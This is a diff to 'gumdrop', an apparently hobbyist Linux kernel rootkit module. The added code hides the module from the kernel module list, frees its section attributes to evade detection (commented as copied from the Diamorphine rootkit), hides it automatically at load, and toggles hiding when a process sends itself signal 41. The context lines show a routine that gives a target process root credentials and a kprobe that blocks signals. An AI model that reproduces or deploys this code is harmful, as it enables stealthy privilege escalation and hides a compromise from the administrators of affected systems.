@@ -2,6 +2,7 @@
 #include <linux/cred.h>
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
+#include <linux/list.h>
 #include <linux/module.h>
 #include <linux/pid.h>
 #include <linux/sched.h>
@@ -12,6 +13,32 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("ceald");
 MODULE_DESCRIPTION("gumdrop");
 MODULE_VERSION("0.01");
+
+// hide and unhide kernel module
+
+static short hidden = 0;
+static struct list_head *prev_module;
+
+static inline void
+tidy(void) { // more sneaky beaky stuff (copied from Diamorphine)
+  kfree(THIS_MODULE->sect_attrs);
+  THIS_MODULE->sect_attrs = NULL;
+}
+
+void hide_module(void) {
+  prev_module = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
+  hidden = 1;
+  printk(KERN_INFO "sneaky beaky time..\n");
+}
+
+void unhide(void) {
+  list_add(&THIS_MODULE->list, prev_module);
+  hidden = 0;
+  printk(KERN_INFO "uh oh we've been discovered\n");
+}
+
+// end of hiding and unhiding
 
 void give_woot(pid_t target_pid) {
   struct cred *newcreds;
@@ -66,6 +93,18 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
         regs); // essentially "block" the signal from reaching the process.
     return 1;
   }
+  if (sig == 41 && target_pid == source_pid) { // hide and unhide the kit
+    if (hidden == 0) {
+
+      hide_module();
+    } else {
+
+      unhide();
+    }
+    regs->ax = 0;
+    regs->ip = get_syscall_return_addr(regs);
+    return 1;
+  }
 
   return 0;
 }
@@ -78,6 +117,8 @@ static int __init gumdrop_init(void) {
     printk(KERN_INFO "cannot register %d!\n", ret);
   }
   printk(KERN_INFO "Hewo pwincess!\n");
+  hide_module();
+  tidy();
   return ret;
 }
 
